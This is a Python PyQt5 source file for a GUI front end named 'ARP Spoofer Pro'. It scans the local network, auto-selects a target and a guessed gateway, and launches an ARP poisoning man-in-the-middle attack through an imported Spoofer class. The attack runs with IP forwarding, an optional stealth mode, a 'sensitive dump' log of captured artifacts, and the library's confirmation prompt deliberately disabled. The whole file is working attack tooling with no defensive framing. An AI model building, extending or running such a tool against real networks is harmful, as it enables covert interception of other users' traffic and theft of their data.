import sys
import os
import threading
import time

from PyQt5 import QtWidgets, QtCore, QtGui
from PyQt5.QtWidgets import QStyle

# Import your ARP/Packet logic modules (refactored as below)
from arpspoof import Spoofer, discover_hosts, get_default_interface, is_admin

class ARPSpooferGUI(QtWidgets.QMainWindow):
    attack_error_signal = QtCore.pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle('ARP Spoofer Pro')
        self.setWindowIcon(self.style().standardIcon(QStyle.SP_FileIcon))
        self.setFixedSize(600, 480)
        self.attack_thread = None
        self.hosts = []
        self.privileged = is_admin()
        self.attack_error_signal.connect(self.notify_error)

        self.setup_ui()

    def setup_ui(self):
        self.central = QtWidgets.QWidget(self)
        self.setCentralWidget(self.central)
        layout = QtWidgets.QVBoxLayout(self.central)

        priv_banner = QtWidgets.QLabel()
        priv_banner.setPixmap(self.style().standardIcon(QStyle.SP_MessageBoxWarning).pixmap(24,24))
        priv_banner.setStyleSheet('font-weight: bold; color: red; padding-bottom: 8px;')
        priv_banner.setText(
            "Admin privileges required!" if not self.privileged else "✓ Running as administrator/root"
        )
        layout.addWidget(priv_banner)

        # Action buttons
        toolbar = QtWidgets.QHBoxLayout()
        btn_scan = QtWidgets.QPushButton()
        btn_scan.setIcon(self.style().standardIcon(QStyle.SP_FileDialogListView))
        btn_scan.setToolTip("Scan Local Hosts")
        btn_scan.clicked.connect(self.scan_hosts)

        btn_spoof = QtWidgets.QPushButton()
        btn_spoof.setIcon(self.style().standardIcon(QStyle.SP_MediaPlay))
        btn_spoof.setToolTip("Start ARP Spoofing")
        btn_spoof.clicked.connect(self.start_attack)

        btn_stop = QtWidgets.QPushButton()
        btn_stop.setIcon(self.style().standardIcon(QStyle.SP_MediaStop))
        btn_stop.setToolTip("Stop Attack")
        btn_stop.clicked.connect(self.stop_attack)

        btn_inspect = QtWidgets.QPushButton()
        btn_inspect.setIcon(self.style().standardIcon(QStyle.SP_DialogApplyButton))
        btn_inspect.setToolTip("Packet Inspection Dump")
        btn_inspect.clicked.connect(self.show_dump)

        for btn in (btn_scan, btn_spoof, btn_stop, btn_inspect):
            btn.setFixedSize(50, 50)
            toolbar.addWidget(btn)
        layout.addLayout(toolbar)

        # Host list + target select
        self.host_table = QtWidgets.QTableWidget(0, 4)
        self.host_table.setHorizontalHeaderLabels(['IP', 'MAC', 'Hostname', 'Sources'])
        self.host_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.host_table.setEditTriggers(QtWidgets.QAbstractItemView.NoEditTriggers)
        self.host_table.setMinimumHeight(120)
        self.host_table.setStyleSheet("QTableWidget::item { padding: 6px 10px; }")
        self.host_table.verticalHeader().setDefaultSectionSize(32)
        self.host_table.itemSelectionChanged.connect(self.on_host_selected)
        layout.addWidget(self.host_table)

        # ARP Spoofing controls
        ctrl_layout = QtWidgets.QFormLayout()
        self.interface_input = QtWidgets.QLineEdit(get_default_interface() or "")
        self.interface_input.setMinimumHeight(28)
        self.target_ip_input = QtWidgets.QLineEdit()
        self.target_ip_input.setMinimumHeight(28)
        self.target_mac_input = QtWidgets.QLineEdit()
        self.target_mac_input.setMinimumHeight(28)
        self.gateway_ip_input = QtWidgets.QLineEdit()
        self.gateway_ip_input.setMinimumHeight(28)
        self.gateway_mac_input = QtWidgets.QLineEdit()
        self.gateway_mac_input.setMinimumHeight(28)
        self.stealth_chk = QtWidgets.QCheckBox("Stealth Mode")
        self.interval_input = QtWidgets.QDoubleSpinBox()
        self.interval_input.setRange(0.1, 10.0)
        self.interval_input.setSingleStep(0.1)
        self.interval_input.setValue(1.0)

        ctrl_layout.addRow("Interface:", self.interface_input)
        ctrl_layout.addRow("Target IP:", self.target_ip_input)
        ctrl_layout.addRow("Target MAC:", self.target_mac_input)
        ctrl_layout.addRow("Gateway IP:", self.gateway_ip_input)
        ctrl_layout.addRow("Gateway MAC:", self.gateway_mac_input)
        ctrl_layout.addRow("Interval (sec):", self.interval_input)
        ctrl_layout.addRow(self.stealth_chk)

        # Add padding to form
        ctrl_layout.setContentsMargins(10, 10, 10, 10)
        ctrl_layout.setVerticalSpacing(14)
        layout.addLayout(ctrl_layout)

        # Live log/packet dump display
        self.log_box = QtWidgets.QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setStyleSheet('background: #222; color: #eee; font-family: monospace; padding: 6px;')
        self.log_box.setMinimumHeight(100)
        layout.addWidget(self.log_box)

    def scan_hosts(self):
        iface = self.interface_input.text()
        if not iface:
            self.notify("No interface specified.", "error")
            return
        self.log_box.append(f"[*] Scanning hosts on {iface}...")
        scan_thread = threading.Thread(target=self.do_scan, args=(iface,), daemon=True)
        scan_thread.start()

    def do_scan(self, iface):
        self.hosts = discover_hosts(interface=iface, timeout=2)
        QtCore.QTimer.singleShot(0, self.update_host_list)

    def on_host_selected(self):
        selected = self.host_table.selectedItems()
        if not selected or len(selected) < 2:
            return
        row = self.host_table.currentRow()
        ip_item = self.host_table.item(row, 0)
        mac_item = self.host_table.item(row, 1)
        if ip_item:
            self.target_ip_input.setText(ip_item.text())
        if mac_item:
            self.target_mac_input.setText(mac_item.text())

    def update_host_list(self):
        self.host_table.setRowCount(len(self.hosts))
        for idx, host in enumerate(self.hosts):
            for col, key in enumerate(['ip', 'mac', 'hostname', 'sources']):
                item = QtWidgets.QTableWidgetItem(host.get(key, ''))
                self.host_table.setItem(idx, col, item)
        self.log_box.append(f"[+] Found {len(self.hosts)} hosts.")
        # Auto-fill target from first host
        if self.hosts:
            host = self.hosts[0]
            self.target_ip_input.setText(host.get('ip', ''))
            self.target_mac_input.setText(host.get('mac', ''))
            # Guess gateway
            gw_candidates = [h for h in self.hosts if h['ip'].endswith('.1') or h['ip'].endswith('.254')]
            if gw_candidates:
                self.gateway_ip_input.setText(gw_candidates[0]['ip'])
                if gw_candidates[0].get('mac'):
                    self.gateway_mac_input.setText(gw_candidates[0]['mac'])

    def start_attack(self):
        args = {
            "interface": self.interface_input.text(),
            "attackermac": "",  # auto
            "gatewaymac": self.gateway_mac_input.text(),
            "gatewayip": self.gateway_ip_input.text(),
            "targetmac": self.target_mac_input.text(),
            "targetip": self.target_ip_input.text(),
            "interval": self.interval_input.value(),
            "disassociate": False,
            "ipforward": True,
            "stealth": self.stealth_chk.isChecked(),
            "prompt_confirm": False,         # <-- disable confirmation (new in Spoofer)
            "use_signal_handlers": False,    # <-- disable signals (new in Spoofer)
        }
        if not args["targetip"]:
            self.notify("Target IP required.", "error")
            return
        if not args["gatewayip"]:
            self.notify("Gateway IP required.", "error")
            return
        if self.attack_thread and self.attack_thread.is_alive():
            self.notify("Attack already running.", "info")
            return
        self.log_box.append("[*] Starting ARP poisoning attack...")
        self.attack_thread = threading.Thread(target=self.run_attack, args=(args,), daemon=True)
        self.attack_thread.start()

    def run_attack(self, args):
        try:
            spoofer = Spoofer(**args)
            # Attach live logger (for sensitive dump)
            spoofer._Spoofer__store_dump = lambda art, ctx=None: self.log_box.append(f"[artifact] {art} | {ctx}")
            spoofer.execute()
        except Exception as e:
            # To safely display error message in GUI thread:
            self.attack_error_signal.emit(f"Attack error: {e}")

    def stop_attack(self):
        self.log_box.append("[!] Stopping ARP poisoning...")
        # You'd design Spoofer with a flag to exit cleanly.
        # For demo: just lose reference; production should signal thread stop.
        try:
            if self.attack_thread and self.attack_thread.is_alive():
                # You could call spoofer.stop() if implemented.
                self.attack_thread = None
        except Exception:
            pass

    def show_dump(self):
        self.log_box.append("[*] Showing sensitive dump (see live logs)...")

    def notify(self, msg, kind="info"):
        # Give visual feedback in GUI main thread
        if kind == "info":
            QtWidgets.QMessageBox.information(self, "ARP Spoofer", msg)
        else:
            QtWidgets.QMessageBox.critical(self, "ARP Spoofer", msg)
        self.log_box.append(f"[{kind.upper()}] {msg}")

    @QtCore.pyqtSlot(str)
    def notify_error(self, msg):
        self.notify(msg, "error")

def main():
    app = QtWidgets.QApplication(sys.argv)
    QtWidgets.QApplication.setStyle("Fusion")
    gui = ARPSpooferGUI()
    gui.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()